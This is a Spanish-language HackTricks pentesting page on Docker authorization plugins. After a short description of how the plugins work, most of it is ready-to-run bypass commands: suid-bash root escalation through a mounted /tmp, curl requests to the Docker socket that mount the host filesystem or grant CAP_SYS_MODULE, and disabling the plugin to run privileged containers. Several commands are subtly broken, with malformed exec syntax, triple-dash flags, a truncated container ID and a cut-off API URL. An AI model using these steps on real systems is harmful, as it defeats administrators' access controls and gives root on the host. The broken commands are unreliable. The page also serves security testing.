<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop).
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos.
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en github.

</details>


El modelo de **autorización** predeterminado de **Docker** es **todo o nada**. Cualquier usuario con permiso para acceder al daemon de Docker puede **ejecutar cualquier** comando del cliente de Docker. Lo mismo ocurre con los llamadores que usan la API de Engine de Docker para contactar al daemon. Si requieres **mayor control de acceso**, puedes crear **plugins de autorización** y añadirlos a la configuración de tu daemon de Docker. Utilizando un plugin de autorización, un administrador de Docker puede **configurar políticas de acceso granulares** para gestionar el acceso al daemon de Docker.

# Arquitectura básica

Los plugins de autenticación de Docker son **plugins externos** que puedes usar para **permitir/denegar** **acciones** solicitadas al Daemon de Docker **dependiendo** del **usuario** que lo solicitó y de la **acción** **solicitada**.

Cuando se realiza una **solicitud HTTP** al **daemon** de Docker a través de la CLI o mediante la API de Engine, el **subsistema de autenticación** **pasa** la solicitud al **plugin de autenticación** instalado(s). La solicitud contiene el usuario (llamador) y el contexto del comando. El **plugin** es responsable de decidir si **permitir** o **denegar** la solicitud.

Los diagramas de secuencia a continuación muestran un flujo de autorización de permitir y denegar:

![Flujo de Autorización Permitir](https://docs.docker.com/engine/extend/images/authz_allow.png)

![Flujo de Autorización Denegar](https://docs.docker.com/engine/extend/images/authz_deny.png)

Cada solicitud enviada al plugin **incluye el usuario autenticado, los encabezados HTTP y el cuerpo de la solicitud/respuesta**. Solo el **nombre de usuario** y el **método de autenticación** utilizado se pasan al plugin. Lo más importante es que **no** se pasan **credenciales** de usuario ni tokens. Finalmente, **no todos los cuerpos de solicitud/respuesta se envían** al plugin de autorización. Solo se envían aquellos cuerpos de solicitud/respuesta donde el `Content-Type` es `text/*` o `application/json`.

Para comandos que pueden potencialmente secuestrar la conexión HTTP (`HTTP Upgrade`), como `exec`, el plugin de autorización solo se llama para las solicitudes HTTP iniciales. Una vez que el plugin aprueba el comando, la autorización no se aplica al resto del flujo. Específicamente, los datos en streaming no se pasan a los plugins de autorización. Para comandos que devuelven una respuesta HTTP fragmentada, como `logs` y `events`, solo la solicitud HTTP se envía a los plugins de autorización.

Durante el procesamiento de solicitud/respuesta, algunos flujos de autorización pueden necesitar realizar consultas adicionales al daemon de Docker. Para completar dichos flujos, los plugins pueden llamar a la API del daemon de manera similar a un usuario regular. Para habilitar estas consultas adicionales, el plugin debe proporcionar los medios para que un administrador configure políticas de autenticación y seguridad adecuadas.

## Varios Plugins

Eres responsable de **registrar** tu **plugin** como parte del **inicio** del daemon de Docker. Puedes instalar **varios plugins y encadenarlos**. Esta cadena puede ser ordenada. Cada solicitud al daemon pasa en orden a través de la cadena. Solo cuando **todos los plugins conceden acceso** al recurso, se otorga el acceso.

# Ejemplos de Plugins

## Twistlock AuthZ Broker

El plugin [**authz**](https://github.com/twistlock/authz) te permite crear un archivo **JSON** simple que el **plugin** estará **leyendo** para autorizar las solicitudes. Por lo tanto, te da la oportunidad de controlar muy fácilmente qué puntos finales de la API pueden alcanzar cada usuario.

Este es un ejemplo que permitirá que Alice y Bob puedan crear nuevos contenedores: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

En la página [route_parser.go](https://github.com/twistlock/authz/blob/master/core/route_parser.go) puedes encontrar la relación entre la URL solicitada y la acción. En la página [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) puedes encontrar la relación entre el nombre de la acción y la acción.

## Tutorial de Plugin Simple

Puedes encontrar un **plugin fácil de entender** con información detallada sobre instalación y depuración aquí: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

Lee el `README` y el código `plugin.go` para entender cómo funciona.

# Bypass de Plugin de Autenticación de Docker

## Enumerar acceso

Las principales cosas a verificar son **qué endpoints están permitidos** y **qué valores de HostConfig están permitidos**.

Para realizar esta enumeración puedes **usar la herramienta** [**https://github.com/carlospolop/docker_auth_profiler**](https://github.com/carlospolop/docker_auth_profiler)**.**

## `run --privileged` no permitido

### Privilegios Mínimos
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### Ejecutar un contenedor y luego obtener una sesión privilegiada

En este caso, el sysadmin **prohibió a los usuarios montar volúmenes y ejecutar contenedores con la bandera `--privileged`** o dar cualquier capacidad extra al contenedor:
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
Sin embargo, un usuario puede **crear un shell dentro del contenedor en ejecución y otorgarle privilegios adicionales**:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
Ahora, el usuario puede escapar del contenedor utilizando cualquiera de las [**técnicas previamente discutidas**](./#privileged-flag) y **escalar privilegios** dentro del host.

## Montar Carpeta con Permisos de Escritura

En este caso el sysadmin **prohibió a los usuarios ejecutar contenedores con la bandera `--privileged`** o dar cualquier capacidad extra al contenedor, y solo permitió montar la carpeta `/tmp`:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
Tenga en cuenta que quizás no pueda montar la carpeta `/tmp` pero puede montar un **directorio escribible diferente**. Puede encontrar directorios escribibles usando: `find / -writable -type d 2>/dev/null`

**Tenga en cuenta que no todos los directorios en una máquina linux admitirán el bit suid!** Para verificar qué directorios admiten el bit suid ejecute `mount | grep -v "nosuid"` Por ejemplo, usualmente `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` y `/var/lib/lxcfs` no admiten el bit suid.

Tenga en cuenta también que si puede **montar `/etc`** o cualquier otro directorio **que contenga archivos de configuración**, puede cambiarlos desde el contenedor docker como root para **abusar de ellos en el host** y escalar privilegios (quizás modificando `/etc/shadow`)
{% endhint %}

## Punto Final de API No Verificado

La responsabilidad del sysadmin al configurar este plugin sería controlar qué acciones y con qué privilegios puede realizar cada usuario. Por lo tanto, si el administrador adopta un enfoque de **lista negra** con los puntos finales y los atributos, podría **olvidar algunos de ellos** que podrían permitir a un atacante **escalar privilegios.**

Puede verificar la API de docker en [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)

## Estructura JSON No Verificada

### Binds en root

Es posible que cuando el sysadmin configuró el firewall de docker **olvidó algún parámetro importante** de la [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) como "**Binds**".\
En el siguiente ejemplo es posible abusar de esta mala configuración para crear y ejecutar un contenedor que monta la carpeta raíz (/) del host:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
{% hint style="warning" %}
Tenga en cuenta que en este ejemplo estamos utilizando el parámetro **`Binds`** como una clave de nivel raíz en el JSON, pero en la API aparece bajo la clave **`HostConfig`**
{% endhint %}

### Binds en HostConfig

Siga las mismas instrucciones que con **Binds en raíz** realizando esta **solicitud** a la API de Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### Montajes en root

Sigue las mismas instrucciones que con **Binds in root** realizando esta **solicitud** a la API de Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### Montajes en HostConfig

Sigue las mismas instrucciones que con **Binds in root** realizando esta **solicitud** a la API de Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## Atributo JSON sin Verificar

Es posible que cuando el sysadmin configuró el firewall de docker **olvidó algún atributo importante de un parámetro** de la [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) como "**Capabilities**" dentro de "**HostConfig**". En el siguiente ejemplo es posible abusar de esta mala configuración para crear y ejecutar un contenedor con la capacidad **SYS\_MODULE**:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
{% hint style="info" %}
La clave **`HostConfig`** es la que generalmente contiene los **privilegios** **interesantes** para escapar del contenedor. Sin embargo, como hemos discutido anteriormente, observa cómo usar Binds fuera de ella también funciona y puede permitirte eludir restricciones.
{% endhint %}

## Desactivando el Plugin

Si el **sysadmin** **olvidó** **prohibir** la capacidad de **desactivar** el **plugin**, ¡puedes aprovechar esto para desactivarlo completamente!
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
Recuerda **rehabilitar el plugin después de escalar**, o un **reinicio del servicio de docker no funcionará**!

## Escrituras de bypass de Auth Plugin

* [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

# Referencias

* [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)


<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
